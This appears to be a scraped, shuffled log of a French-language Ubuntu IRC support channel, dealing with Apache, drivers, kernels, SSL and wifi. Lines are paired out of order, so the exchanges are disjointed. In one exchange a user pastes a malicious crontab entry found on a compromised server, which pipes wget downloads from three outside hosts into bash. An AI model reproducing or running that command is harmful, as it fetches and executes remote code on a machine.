mais bon je dois pouvoir trouver	l'os free o_O
si tu ouvres http://192.168.0.21 ça fonctionne chez toi ?	je ml'en doutais
non inactif c bon	tu as une v6 ?
ce qui est bizarre c'est que j'ai rien en logs apache ou access log	error.log
et il me manque la partie routeur pour pointer sur lip local 192	ben dans l'interface free c'est assez accessible dans mes souvenirs
ca vous rappelle un truc ?	pour discuter d'autres choses que du support, merci de taper /join #ubuntu-fr-offtopic
j'ai une IP fixe pour info	oui c'est possible :)
C'était juste pour le côté pratique mais bon si c'est illégal je cherche pas plus loin lol	c'est pas tant la manip' que le fait d'en parler ici
quelqu'un a déjà installé ubuntu sur un xu4 ici ?	odroid ?
pour l instale comme d'habitude gravure iso et boot sur lecteur pour une instaler complete et propre	tu peux utiliser une clef usb aussi pour l'install
c'est pas faux effectivement	je voulais voir, et l'ai lancé, c'est juste mon top process, qui me bouffe + de 12 0e cpu en continu
brendan <3	le monsieur c'est de quoi il parle, effectivement :)
plus de 100 Mo d'apres le screenshot oui	perso, je trouve ca plus utile: http://www.brendangregg.com/Perf/linux_observability_tools.png
je vais faire la version bourrinne ^^	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
je suis en qwerty moi	cap de faire un selfie avec Stallman et un dvd Windows
je le vois vendredi soir \o/	donne lui une copie de Windows 10
quelqu'un à la page de la doc ubuntu pour savoir quel fichiers sont chargés au démarrage ?	à l'eau
accesoirement,si,quelqu'un,serais,m'expliquer,comment,rebinder,la,touche,espace,ailleur,je,suis,prenneur	pour remaper les touches: regade la doc de xmodmap
voila	pas de chamaillerie sur les salons publiques, encore moins sur les salons de support … si tu veux te chamailler, fais ca en /query, si tu ne veux pas te chamailler /ignore … mais ca n'a rien à faire ici :/
via iptables, il faudra qu'il s'amuse avec burst etc pour detecter si c'est un scan ou pas …,  ça va pas être simple non plus :)	tu fais ca en 4 lignes juste avec limit
je connais un peu iptables (parfeux windows ) mais sa fais longtemps que jai pas jouer avec	tu veux monter une usine à gaz pour rien, think the unix way, chaque outil pour une tache specifique
ok dommage , peu etre que je pourai trouvé des scripts deja fais !! enfin je usis limiter dans le temps cest dommage	ne lisant pas dans les pensées, je ne peux que tenter de deviner ce que tu cherches à faire, mais si tu as déjà une db existante dans un format à toi, avec un schéma à toi, y a rien qui va magiquement comprendre ton organisation de db pour s'y connecter magiquement
ok , un tuto/logiciel a me proposer pour faire cela    avelldiroll	iptables … éventuellement fail2ban … après pour comparer à une bd existante à toi, y a pas d'autres moyen que de scripter ton propre truc, à partir des logs d'iptables par exemple
Bonjour tous user Ubuntu, y a til des gens qui on tester un Ubuntu phone	pas moi, mias j'en connais 3, un seul satisfait, celui qui ne s'en sert pas pour telephoner
pas moi, mias j'en connais 3, un seul satisfait, celui qui ne s'en sert pas pour telephoner	j'ai bien envie  de tester mais un meizu a 300€ pour du test ca craint,
 salut ,   je cherche afaire de la Surveillance Réseau -(exemple je veux faire un logs de toutes les ip qui me scanne etc et les comparer avec ceux de ma propre Bdd	et ? (indice: il faut poser une question)
si c'est signé il autorise, si y'a pas de signature c'est deny	merci de t y etre interessé
grub sera pas capable de booter windows	en gros, si tu foires ton partitionnement, ton secure boot ne va pas changer grand chose c'est psa fait pour ça d'apres ce que je vois, c'est un firmware qui check les signatures ou nope
alors pourquoi tu m'en parles ? :/	tu étais pas dans la discussion y'a cinq minutes ? désolé
j'ai jamais parlé de ça	je sais :)
ça evite aussi de taper sur F2/F9 ou autre et eviter de booter sur une clé ou un cd	en quoi ça va proteger l'user d'un partitionnement foireux via gparted par exemple :/
je vais virtualiser avec  windows en host	tu penses que ça va proteger ton Windows de la casse d'un partitionnage foireux ?
bonjour je voudrais savoir si je peux installer une ubuntu à coté d un windows 10 en secure boot	?
Je fais la mise à niveau et je te dis quoi ^^	tu avais aussi essayé via le .run d'AMD ?
Apparement c'est un module du kernel ou je sais pas trop :/	de mon temps fglrx-update fichait la pagaille fallait pas l'installer
c'est phun :)	 Non Xubuntu 14.04 :)
Ecran noir avec login	moi j'ai plus fglrx depuis un bail ... t'es sur d'en avoir besoin ?
mon mono neuronne il bogue là :)	ayé j'ai retrouvé webgl ... c'est trop ce qu'ils réussissent à faire avec maintenant : https://developer.mozilla.org/fr/demos/detail/ioquake3js
ayé j'ai retrouvé webgl ... c'est trop ce qu'ils réussissent à faire avec maintenant : https://developer.mozilla.org/fr/demos/detail/ioquake3js	je regarde ça peut être interessent
Même en installant Catalyst manuellement ça fonctionne pas quand je reboot :x	Ubuntu 15.04 ?
?	http://pastebin.com/KFwv4qww
np :)	00:01.0 VGA compatible controller: Advanced Micro Devices, Inc. [AMD/ATI] Mullins [Radeon APU A6-6200 with R3 Graphics]
je vous suis plus là les linuxiens :)	about:gpu dans chromium et ctrl + f Video Decode et apres Video Encode, et montre nous les deux résultats, mvvvv :D !
http://crbug.com/137247 ça va venir un jour	j'ai désactivé la black list ... version kamikase et j'ai retrouvé l'accélération ... non mais ...
chromiun plante au démarrage:(	donc google chrome, c'est radical ^^
aucuns pilotes additionnels dispo ;;	dans firefox about:plugins
Bonsoir, la molette de ma sourire me permet de circuler dans mon historiques, comme dévérouiller?	pas sur qu'on ai bien saisi ta question
La machine qui ne démarre pas est le serveur (pas le client)	tu a juste poster le bootlog ?
(j'essaye)	donc ouais boot sur un live system de la facon dont tu veux et past les logs a ce moment là
meme le fstab, au final ça serait bien qu'on le voit	si il peux booter sur une iso c'est sufisant, il monte sa partoche / ou /boot selon et il choppe les logs
Je ne connais pas encore très bien l'organisation des logs, mais en effet il y a des chances que ça soit écris quelque part	au cas ou, si tu a retoucher ton fstab, verifie aussi que le formatage est bon, hors du pb d'uuid j'entends
Mais il me semble désormais plus probable que l'affichage se bloque avant le vrai message d'erreur, je vais vérifier quel paramètre filer à grub pour ne pas afficher la spalsh	dans ces cas là tu devrais avoir un log quelque part
Mais le système ne démarre pas jusqu'au bout, en revanche je peux démarrer en rescue sans problème	c'est surprenant je trouve
ca va créer des dysfonctionnalités sur de court/long terme	on s'en occupe
j'aimerais bien comprendre a quoi corresponds le "M-qq chose" dans les raccourcis, je vois bien que je doit faire un ctrl+b avant chaque commande normalement mais je vois pas ce que "M-" indique	 "They are the Alt key: so, to switch to tiled layout, you would press Ctrl-a Alt-5..."
merci beaver mon pote est venue m'aider	du coup il t'a expliqué à comment il est arrivé à cette equation du sources.List ?
) il a installé la version propriétaire pour rien ?	il faut croire
bonjour à tous, j'ai une question sur le logiciel qui fait tourner les ventillo pour les carte graphique 970, il y a t'il un équivalent pour ubuntu ? (question d'un néophyte merci de votre compréhension x) )	il n'y a pas vraiment d'équivalent de MSI Afterburner pour Ubuntu...
bordel tmux dans tmux ca déconne	et les core devs java bossent sur openjdk … vu qu'ils ont refusé d'integrer oracle pendant le rachat, oracle maintient une version en recuperant certaines evolution d'openjdk et en maintenant de vieilles modifications, mais il y a peu d'effort de dev sur java de la part d'oracle
puis ./install je sais plus quoi	ca depend comment tu l'installes, mais si tu lis ce qui avait été ecrit avant, ils parlaient de /usr
ca depend comment tu l'installes, mais si tu lis ce qui avait été ecrit avant, ils parlaient de /usr	j'ai bien lu
(archive.org si vous me croyez pas)	pour certain soft je force oracle jvm
ca rassure	l'archive java contient l'installateur
mais bon, oracle java à quelques trains de retard par rapport à openjdk … et openjdk est l'implementation java de reference depuis un moment (depuis le rachat de sun)	le java de oracle, il va se mettre dasn /opt
comment c'est possible qu'oracle soit en retard sur java sachant que c'est eux qui l'édite ? o_O	en retard ?
ah bah voila effectivement on voit que tout de suite c plus compliquer lol	nous allons avoir une longue journée avec toi
aaah ok merci beaver	t'as tout dans ce pdf, c'est juste la bible ^^
déjà cmt je sais si mon ordi c'est 32 ou 64-bit pC?	je t'invite à faire ça, tu vas prendre allez, 1h, pour lire correctement le tutoriel, tu reviens dans ~ 1 h, si t'as des questions, tu n'hesites pas
euh ça ressemble à quoi?	tu tapes clear
c'est automatiquement root	voilà et elle ajoute le sudo à ça
euh...la chance du débutant?	on peut voir ton sources.list ? cat /etc/apt/sources.list
j'étais juste un gros flemard	tu savais pas quelle sudo -s au prealable aussi
je suis un eternel debutant moi :)	le sudo passera :D
le sudo passera :D	oui mais c'est cradingue
ah ben merci à toi!	faut faire attention à ce que tu tapes :), bon la ça fait rien de grave, car bein c'est foireux
ayé! enfin!!!	http://www.digitude.fr/wp-content/uploads/2015/07/URL.png
bonjour à tous, est ce que quelqu'un connait l'equivalant de time machine pour ubuntu ?	back to the futur !
ok désolée je suis sans doute pas douée mais ça fait pas du tout réagir le terminal	tu utilises quelle version d'Ubuntu ?
bonjour! toute nouvelle sur ubuntu, et pas moyen d'utiliser netflix. ni d'installer chrome pour ça. quelqu'u aurait-il la solution? merci d'avance!	aptitude/apt-get ?
fait chier	tu es surtout trop rapide, j'ai même pas eu le temps de dpkg -l
essaye de taper ici: /exec pwd	es tu la?
non kadiro	lsb_release -a
ok c'est fait	le résultat je te prie
j tapé /exec pwd ici O_o haha	^^
ùais je ne désespère pas d'y ariver	tu ouvre le terminal puis tu tape pwd puis entrée
jour kadiro	donc ça donne ?
Aucun fichier ou dossier de ce type	pwd
quand je scroll je ne l'ai plu	c'était une affirmation, y'a aucune forme interrogative dans mes écrits pour le coup :)
Veuillez utiliser « apt-get autoremove » pour les supprimer. 0 mis à jour, 0 nouvellement installés, 0 à enlever et 12 non mis à jour. yano@None:~$	?
Les paquets suivants ont été installés automatiquement et ne sont plus nécessaires :	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
commande introuvable :(	la commande "du" ?
mi non plus	sudo apt-get install ubuntu-minimal ubuntu-standard
c'est ce que j'ai fait ... commande introuvable :(	tu utilises Ubuntu hein :)
ok	Ubuntu 14.04 ?
mais je n'arrve pas à finaliser l'install	c'est pour toi :)
?	tu as regardé du côté de http://doc.ubuntu-fr.org/cinelerra ?
de rien Sylario ;)	c'est pas évident :)
c'est pas évident :)	ouais je sais bien, mais c'est intéressant (en connaissance) et ça m'arrangerait :P
ok, oui je pense	si c'est le cas, un resize2fs de ta partition doit faire l'affaire
je teste tout est backup	t'as de la place sur le vg ?
t'as de la place sur le vg ?	le vg? j'ai agrandit la taille du disque dans l'admin
Gandi serveur	j'ai checké, et Gandhi utilise des partitions LVM
je sais pas ce q'uils utilisent	t'es sûr que c'est pas un container ou un truc comme ça ?
Disk /dev/xvda2 doesn't contain a valid partition table	c'est une VM ?
c'est une VM ?	oui
oui	il me semble (mais à confirmer) que certains systèmes de VM n'utilisent pas un système conventionnel pour gérer les partitions. Tu utilises quoi comme logiciel ?
et en fait quand tu parles de "vieux pc" tu veux dire "vieux portable" ?	ah masi j'ai déjà viré X :)
dans les paramètres d'économie d'énergie	ah pardon, j'ai pas précisé
:)	variable et toute relative
puisque quand je fais clic droit sur un dossier propriétés ca me dis espace libre 300go	c'est l'avantage du script oui
je re	au pire le sleep il fait rien de mal la, il est juste useless
mvvvv le menu edition preference de quelle appli ?	 y'a des chances que ça soit pour toi
!wiki bleachbit	http://doc.ubuntu-fr.org/bleachbit | http://doc.ubuntu-fr.org/nettoyer_ubuntu | http://doc.ubuntu-fr.org/systeme | http://doc.ubuntu-fr.org/personnaliser_livecd
- onglet  "comportement" au paramètre "fichier texte exécutable" tu coches "Demander à chaque fois"	à ma commande il manquerait peut être un sleep pour lire :D
justement non c'est ce a quoi je m'attendais egalement cette boite de dialogue	voir menu Edition/préférence onglet comportement "Fichier texte exécutable"
oui la case est cochee jte jure	pas d'espace avant ou après le #!
je l'ai enregistré en .sh et le contenu je te le pastebin	ouvre ton terminal Crt+shift +T et execute ton programme ?
je voudrais juste avoir a double cliquer dessus pour qu'il souvre ds un terminal	?
chmod +x ~/chemin/vers/ton_script.sh	roh :þ
et tu veux l'ouvrir avec quoi ?	08/20/15 12:27:42 < -acer34190> bonjour, j'ai un script test.sh quand je double clique dessus il l'ouvre avec gedit ca ne me propose pas de l'ouvrir avec le terminal, sur les  fofos j'ai pas trouver de facon simple de remedier à ca peut t'etre qu'ici quelqu'un ura une idee ???
 acer34190 tu utilises Unity ?	c'est compris.  c'est juste pour un site, donc je n'ai pas besoin de wildecard.
le plus amusant c'est de voir la liste des autorités dans le browser ... c'est qui l'autorité des autorités ?	c'est à fond offtopic la ^^
j'ai lu, excusez pour le off-topic :)	donc tu as Let's Encrypt qui n'est pas encore lancé, ça commence en novembre 2015, et les wildcards seront pas permis, ou tu as cloudflare
le fait qu'il ait signé ton certificat ne leur donne pas la possibilité de déchiffrer ton traffic	sans wildcard, c'est deja gratuit … startssl
sans wildcard, c'est deja gratuit … startssl	aussi :>
vraiment ?	tu ne leur files pas ta clé privée
tu mélanges alègrement deux protocoles	rha oui la bourde :X
sinon je ne connaissait pas le chanel offtopic alors off jygo	cloudflare c'est un cdn par contre
y'a pas de code de retour http pour des requêtes dns	mes excuses
oui, sauf si vous avez une solution qu s'install en apt-get install ....	une authorité de certification, ça s'installe pas via apt-get par contre
tu mélanges tout et tu dis n'importe quoi là	je donne juste le résultat de mon test, que sa questin ne concernant pas le ndd ok
pour guenhael peut être qu'il y'a un 301 dans le lot	il est parti, et ça ressemble simplement à un enregistrement round robin
il est parti, et ça ressemble simplement à un enregistrement round robin	un 301 ça donne le même résultat aussi
je souhaite utilise ssl et j'ai besoin d'une autorité de certification.  Y en a t il d'autre que startssl gratuite?	euh :)
salut	pour discuter d'autres choses que du support, merci de taper /join #ubuntu-fr-offtopic
!wiki gparted	http://doc.ubuntu-fr.org/gparted | http://doc.ubuntu-fr.org/repartitionner | http://doc.ubuntu-fr.org/partitions | http://doc.ubuntu-fr.org/uuid_et_label | http://doc.ubuntu-fr.org/lvm
bonjour, j'ai un script test.sh quand je double clique dessus il l'ouvre avec gedit ca ne me propose pas de l'ouvrir avec le terminal, sur les fofos j'ai pas trouver de facon simple de remedier à ca peut t'etre qu'ici quelqu'un ura une idee ???	il faut rendre ton script exécutable
j'essaie de bidouiller les paramètres dans advanced...	la majorité des ses clients surement
c'est pour ça que j'ai installé vpnc :D	windows ne supporte que les vpn pptp en natif
windows ne supporte que les vpn pptp en natif	la livebox tourne sous Windows ?
(et une IP, évidemment)	on dirait que c'est de l'ipsec
bas si ça existe pourquoi pas après tout ^^	tu joue via wine ou playonlinux?
à c'est juste un channel d'aide, non clairement je suis tout nouveau sur ubuntu et après avoir galerais a installer league of legend (entre autre ) je cherche a discuter connaitre comprendre bref rien de précis	c'est sur quakenet: https://www.reddit.com/r/leagueoflegends/wiki/irc
un peut tôt peut être pour trouver du monde ici ?	peut-etre tu peut chercher un canal specifique de league of legend alors?
salut =)	ah bon, je comprend
car je restart tout le temps	regarde tes pv
mais meme si je les commente ca change rien en fait :(	tes logs disent quoi .
http://pastie.org/private/vqkb1v6hl4fdm57j2ard5q	tes ErrorDocument sont pas bons
UseCanonicalName Off marche pas	mets les "www"
sans	met les
ligne 48	non pas sur le paste
non :(	tu as essayé d'ajouter : Require ip 127.0.1.1 ?
peter > apache2/apache2.conf j'ai pas de ligne serverName du tout nul part	faut l'jouter
amphirions du coup on le verrait pas au ping ?	dans /etc/apache/apache.conf
host => http://paste.ubuntu-fr-secours.org/src-147654	oula
amphirions > ca marche parce que url = 192.168.0.21	tu peux nous montrer ton /etc/hosts ?
et pour le host :	si tu tapes www.camps-catholiques.dev tout seul
a mon avis il te manque une entrée : 127.0.0.1 www.camps-catholiques.dev	ah ben oui ᴖ_ᴖ
et tout marche super bien depuis un ordi distant sur le local	ajoute les ServerAlias là
ping  www.camps-catholiques.dev fonctionen ?	il a ça <VirtualHost *:80>
parce que si tu Listen pas en localhost ...	en 127.0.0.1 ça fonctionne
en 127.0.0.1 ça fonctionne	sauf si il a plusieurx vhost
sauf si il a plusieurx vhost	exact
marche pas	logiquement tu ne devrais pas avoir besoin de servername/alias
j'ai ajouté http://paste.ubuntu-fr-secours.org/src-147651	le Listen il est config comment ?
http://paste.ubuntu-fr-secours.org/src-147650	ha !!!
en fait ca ne marche juste pas si je passe par camps-catholiques.dev en local sur le server	si tu ping camps-catholiques.dev ca repond en 127.0.0.1 ?
http://paste.ubuntu-fr-secours.org/src-147649	je vais te taper :)
…	tu as peu etre reelement pas compris ?
(heu ... en français ça donne quoi ?)	en francais ca donne toi t pas relou ?
lol	ça c'est de la redirection web
c'est simple depuis une box	mouhais ça se fait
domaine vers du local ... mouhais mais ça va pas sortir très loin	et pourquoi ?
c'est juste que je retrouve pas ton dernier pastie :)	ça coute rien de checker le retour de ma commande ;)
en local ça fonctionne	pour les interfaces, 0.0.0.0 ça veut dire toutes, et sinon, tu donnes l'IP de l'interface elle même
ou y'a ton serveur web donc	les hotes de son réseau joignent sont port 80 avec l'adresse destination 192.168.x.x donc il doit ecouter sur cette interface
Existe-t-il une version Ubuntu compatible avec le Rpi2 ? Merci	https://wiki.ubuntu.com/ARM/RaspberryPi
Je voulais eviter les deux étapes mais s'il le faut ... L'archive contient un ensemble de module livré de base, j'en désactive (supprime) selon les services et je ne veux pas les redésactiver à la main à chaque fois différement pour chaque service ... Merci pour la réponse ;-)	un truc de ce genre : find . -type f ! -name test.tar | tar xf test.tar
Bonsoir, je souhaite extraite d'un fichier tar.gz seulements les fichiers avec le même nom présents dans le répertoire de destination. J'ai trouvé pour faire l'inverse mais je reste bloqué pour ce besoin (Exemple mon archive a file1 & file2 ; dossier destination a file2 ; apres extraction, seulement file2 est mis à jour mais file1 n'est pas créé)	avec find ou autre chose du genre tu devrais pouvoir t'en sortir
piti et beaver vous etes toujours la ?	tu peux essayer baobab, c'est pas mal
et ca donne ca http://pastebin.com/eD7Tt0BL	oui
udev                          1,9G     12K  1,9G   1% /dev	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
merci	df -h raconte quoi ?
:D	aka mattux|troll :Þ
-1	il va t'expliquer ça
et je ne vois qu'un film et 2-3 photos. Normal?	mais j'ai envie de dire que oui c'est normal, t'as du supprimer tes donnees par le passé non ?
il est censé y avoir pas mal de données dessus, plusieurs dizaines de Go	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
+1	tss :)
Alors pour info, je suis un noob, mais qui a envi d'apprendre. Donc pas trop vite svp	quelle version d'Ubuntu utilises tu ?
Salut AlexxC	oui
ah ben voilà	euh, voilà quoi ?
exemple là je suis en 14.04 LTS avec un noyau 3.13.0-61 (pas encore redémarré sur le 3.13.0-62 :p	il est sous kubuntu 14.04.1
il suffit de noter la version du nouveau noyau et voir le lendemain si dans les mises à jour, se trouve un autre noyau …	je suppose qu'il doit avoir ouvert sa session sur l'avant dernier noyau, c'est ça ?
sorry, ça va trop vite pour moi ! :-D	je penses que changer l'ordre des noyaux au boot est peut-être une meilleur solution car si tu supprimes simplement l'ancien il va reapparaitre lors de la prochaine mise à jour (sauf si tu marques le paquet)
Je lui dit donc de booter sur le noyau précédent et de supprimer le nouveau noyau via synaptic, c'est bien ça ?	oui, sinon tu peux utiliser https://launchpad.net/grub-customizer pour changer le noyau par défaut
grub	pas besoin de faire un update de grub
si il utilise une version du noyau "outdated" et que cette version du noyau est assujetti à une faille … hm	c'est une solution en attendant un fix
Bonjour tout le monde, quelqu'un peut-il m'aider pour un problème de noyau ?	pose ta question directement
des .jpg	essaye mogrify -rotate 90
salut	bjr
du coup, ça expliquerait qu'il ne puisse pas utiliser deux GPU utilisant un driver différent en même temps :D	aventures-toi sur wayland ou mir alors
c'est frustrant car matériellement c'est possible	sur l'article que tu as donné plus haut, il n'utilise pas différents drivers, mais apparemment deux GPUs identiques
sur l'article que tu as donné plus haut, il n'utilise pas différents drivers, mais apparemment deux GPUs identiques	oui et ce sont des Nvidia Quadro donc pas du tout le meme matos que les AMD R9 par exemple
(dû à fglrx, si j'ai bien suivi)	d'acc moi aussi j'utilise fglrx car les autres pilotes ne fonctionnent pas (j'arrive pas à les faire fonctionner)
mais je n'ai pas trouvé comment faire gérer les deux par le même X, si c'est possible	tu avais essayé de faire : xrandr --listproviders  ? as-tu bien les deux cartes ?
et je n'ai pas réussi à faire mieux	idem :(
ce n'est guère le cas sous GNU/Linux	il n'y a donc aucune possibilités de le faire sous Linux ?
j'ai un PC fixe avec une carte graphique intégré au CPU (i3) et une R9 270. Je n'arrive pas à utiliser les deux cartes en meme temps pour faire du multi ecran. Est-ce possible ? Merci	non
mais pas de X	c'est pas toi qui dis toujours que X c'est useless ?
c'était juste super long à se lancer	au hasard, le temps que le test du disk timeout
et il me dit que le squashfs est corrompu -_-	lance un live-debian (ou cherche comment virer plymouth d'ubuntu pour avoir un boot en text-mode) et appuie sur "s" si ca bloque pendant le boot (s pour skip)
yep, c'est normal … sur un UEFI, tu peux laisser grub, sur un BIOS il faut toujours syslinux (ou grub4dos, mais c'est du syslinux en dessous)	mais au final, GRUB ne voit pas Mac OS, il est juste chainload par reFIND pour booter Ubuntu chez moi
mais au final, GRUB ne voit pas Mac OS, il est juste chainload par reFIND pour booter Ubuntu chez moi	je ne parle pas de macos, je parle de la partoche EFI
tu prends donc les ISOs "classiques" :)	y a plus l'iso special mac? dû au fait que les mac trainent un EFI et pas un UEFI ?
au final, à part les modèles Retina, ça marche bien en Ubuntu :)	tu l'installes comment, refit ?
je donne toutes les infos qui pourraient aider à identifier la bestiole :)	ah oui ... c'est spécial comme procédure : http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-mac-osx
(comme les anciens)	couché le troll !
:)	uhm, les nouveaux sont plutot en acier brossé non ?
mais peut être que ce n'est pas possible avec tous les modèles, oui	il est vieux comment le macbook ?
(parce qu'un écran tout gris, ça n'aide pas à diagnostiquer le problème...)	Je crois que  mac n'autorise pas le boot usb ... à vérifier
rien au niveau des logs ?	comprendre que c'est normal visiblement
chaud :\	\o/
\o/	o/
(il faut rm le site dans /etc/nginx/sites-enabled au final lol) moi qui croyait que le site "default" était un symlink :°	"rm" ?
bein tu avoueras qu'il y'a pas mal de parametres à prendre en compte :)	c'est dans gnome-tweak-tool
Les gars, est ce que ubuntu supporte le QHD? => WQXGA+ (3200 x 1800)	c'est vachement generique comme question :D
suis entrain de me prendre la tête avec owncloud	sous ubuntu ?
sous ubuntu ?	ouep
je me demande presque si ça vient de kvm sous ubuntu	o/
o/	O/
oui SurcouF nous sommes tous sous Ubuntu ici, c'est connu ♫♬♩♫♪	je m'en doute mais impossible de bootstraper une jessie
mais bon, j'ai des bouts de conf apache que je perfectionne depuis plus de 10 ans	ça va valoir une fortune sur le bon coin
jamais eu de souci avant	comme quoi d'une configuration à une autre … :)
beaucoup de box a portée ?	oui
mais je l'explique pas	pour les raisons de ne pas avoir deco et/ou la ligne deco est grisé
pour les raisons de ne pas avoir deco et/ou la ligne deco est grisé	bein j'ai le terminal que je remote en ssh qui freeze avec network-manager au final via network-manager, et boom, j'ai plus de jus au bout
(19:53:34) Sylario: La 14.04 elle est basée sure quel debian? impossible de trouver l'info // au pif je dirais sid	c'est ça
64bit	essaye de reinstaller firefox ou de retirer qq plugins pour voir qui cause tout ca
j'ai ubuntu gnome	tes cookies peut être ? ou bien un addon foireux ?
c'est pour les avertir, car il y ai depuis hier. Et je pense qu'ils ont que des testeurs windows du coup (enfin sauf si c'est un problème de chez moi)	je suis sur le lien, c quoi le problème?
J'ai pris le plus simple	mail -f ?
mail -f ?	merci :)
alors qu'en 10 caractères maxi sur ton navigateur tu peux retrouver le format de l'URL et la compléter ensuite	limité dans quel sens ?
'tain ça serait utile pour le helping mine de rien	http://packages.ubuntu.com/<codename ubuntu>/<paquet>
allez niko pourquoi pas nous pondre un alias qui effectue un "search" dans packages.ubuntu.com, ça serait un alias du style !apt <package> <version ubuntu> ça serait excellent	ah ouais, je regardais dans trusty, désolé :)
et Debian n'aime pas Ruby 2 : (	il y a bien un paquet ruby2.0 dans Ubuntu
+ leurs dépendances	je pense qu'il monologue
le 2.1 il a du interpréter ça bizzarement	2.1, il a considéré que tu voulais installer tous les packages contenant "2.1" dans le nom
2.1, il a considéré que tu voulais installer tous les packages contenant "2.1" dans le nom	ça doit être ça
ça doit être ça	tu ne lis pas ce qu'il raconte ?
tu verras les dependances	apt-cache depends package
ok donc en fait apt-get demande une syntaxe du typr packagename=1.2.3 pour les versions	apt-cache showpkg ton package
Salut mvvvv	salut, alors cet USB3 ? il marche ?
la personne voulait une seconde carte son (en externe) et voulait utiliser MIxx. Mixx la prenait mal en compte ( probleme résolu suite frequence trop elevée) mais je voulais faire les tests dans les paramètres sonores avant je n'ai jamais pu	que te raconte pavucontrol ?
Bonjour Eniot. Je ne suis pas pro audio, mais essaie de vérifier le côté audio (pulseaudio ?). Tu as fait des manips avant que le problème n'arrive ?	le Wine dans les dépôts Ubuntu est déjà en 64 bit si je ne m'abuse
tu peux /nick	tu peux m'aider pour l'install de wine ? Pour wine je pense que ça ne va pas poser de pb mais c'est pour l'install de wine64 que je pige que pouique.
!wiki wine	http://doc.ubuntu-fr.org/wine_trucs_et_astuces
Salut avelldiroll	pettie précision tres importantes que j'ai pas précisé, jsuis au boulot la donc je peut pas tester en direct, juste pour avoir des piste , donc je note tout mais je peut pas donner les resultat ^^'
!wiki nvidia	http://doc.ubuntu-fr.org/nvidia | http://doc.ubuntu-fr.org/problemes_nvidia | http://doc.ubuntu-fr.org/prime | http://doc.ubuntu-fr.org/nvidia_optimus | http://doc.ubuntu-fr.org/carte_graphique
Oui, une petite minute, je vous poste ça : c'est quand que je veux faire la mise à jour l'informaticien ma dit de faire ; apt-get update et apt-get upgrade mais sa ne fonctionne pas et il m'a dit de venir vous voir	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
t'as deux fois plus de chances de réussir à booter :)	ok, donc pour boot sur ma partition ext4, me suffit juste de mettre le flag boot ?
Salut, je suis sous ubuntu 11.04, mais je n'ai pas de CD >700Mo, impossible de boot sur USB, comment mettre à jour ma distrib' ? merci	tu utilises update-manager
!wiki chroot	http://doc.ubuntu-fr.org/chroot | http://doc.ubuntu-fr.org/schroot | http://doc.ubuntu-fr.org/vsftpd | http://doc.ubuntu-fr.org/personnaliser_livecd | http://doc.ubuntu-fr.org/proftpd
rails	sudo find / -name kaiten-src.c
dailleur faudrait que je trouve si on peux DL la  VM	ok :)
je veux voir la tête de celui qui dit ça à voix haute :D	son hdd visiblement, il va mourir :D
et?	tss pas toi :)
salut a tous, j'ai un dossier qui est soudain devenu inaccessible sur l'un de mes disques dur et donc j'ai fait un smartctl pour évaluer si ca venait du disque lui meme mais je ne sais pas interpreter les résultat, quelqu'un peut-il me dire si le disque est sain? http://pastebin.com/8Q8Un64S	essaie un outil graphique ?
passé root en tout cas	oui... je sais bien. Hormis des solutions exotique...à mon avis c'est fichu
bah faut verfier a la main si y'a aps des trucs spaces  etc ...	c'est une ligne dans mon crontab
Comment je fait ça?	des GET comme ca, c'est commun, faut voir si c'est passé
J'ai ça dans crontab : wget -O - colkolduld.com/cmd1|bash;wget -O - lochjol.com/cmd2|bash;wget  -O - ddos.cat.com/cmd3|bash;	faut regarder si le truc est passé ;p
casser*	outre ça, nous avons fait le tour, le probleme il est cerné, c'est visiblement le driver
ho noes, je crois que je me suis fait botneter mon serveur	ahahaha
 /var/log/syslog plutôt	ça ne change rien
tailf /var/log/kern.log et co' toi à ta box	rien de nouveau
(en esperant que le driver broadcom n'est pas load, je te fais confiance hein)	euh....
un driver privalibre?	oui, c'est un nouveau concept... une seule menotte :-D
pas besoin de su pour le coup :D ni même de sudo	je cherche toujours le pipe :-D
lsmod | grep broadcom l3ibi ça te retourne un truc ?	pour installer le firmware broadcom ça m'aurait aidé :-p
mais avant ça 08/17/15 16:48:58 < beaver> nmcli dev wifi tu vois ta box ?	non. Mais en fait il m'indique juste 'connecté' sauf que c'est pas le bon reseaux
bon, ensuite, suffit de faire ça : nmcli dev wifi 'TON_ESSID'	j'ai un "connecté" mais c'est pas le bon réseau
Dans le /var/log/syslog j'ai un ip-config -> Failed (reason 'ip-config-unavailable' qui s'affiche en rouge	la commande de Snarf elle est pour toi
mm le chip wifi des macbook <3	pourtant elle arrive à se connecter à d'autre réseau... c'est ça qui m'étonne
mouep, ça va pas être simple sans les logs, on voit rien de space là, outre que tu as du wifi, mais on voit pas l'ap avec lequel tu cherches à t'associer ni rien	est-ce que si je te précise que si je branche un dongle wifi sur l'ordi j'arrive à me connecter ça t'aide ?
c'est pas marrant sinon	j'aurais pas mieux que ça http://paste.ubuntu-fr-secours.org/src-147643
tu effectues pas d'auth la :) l3ibi si ?	comment ça ?
comment ça ?	tu essayes de te co' à ta box en // de ton tailf /var/log/kern.log ?
i don't understand	l10n == "localization" i18n == "internationalization"
ahaha :)	paste.ubuntu-fr-secours.org/src-147642
phillip L10n is a french city (lyon)  it's a private channel	juste en passant #ubuntu-fr-l10n etait bien le bon chan l10n n'a rien a voir avec Lyon
idem, il faudrait les logs de l'autre ordi' en ce moment l3ibi	je change d'ordi je te fais ça
ah oui certes sous Ubuntu pas besoin, je re'	pas que sur Ubuntu :)
!paste	http://paste.ubuntu-fr-secours.org/src-147641
ici	pas besoin de sudo pour lire le kern.log normalement
tu vois ce qu'est un terminal l3ibi ?	oui
oui	tu tapes ça : sudo tailf /var/log/kern.log et en // co' toi à ta box, et tu donnes ce qu'il y'a dedans
faut voir pour toi, je re'	https://github.com/jlaine/wilink <-- ici ils supposent qu'un "dpkg-buildpackage" est suffisant … mais on voit aussi que le code a recu peu de mises à jours depuis 2 ans
avelldiroll > Savoir si ces options prennent en compte l'abonnement du compte, etc..., ce genre de trucs	ca faut regarder un client SIP et leur demander … si ils t'envoient bouler, dis leur que tu configures un telephone SIP
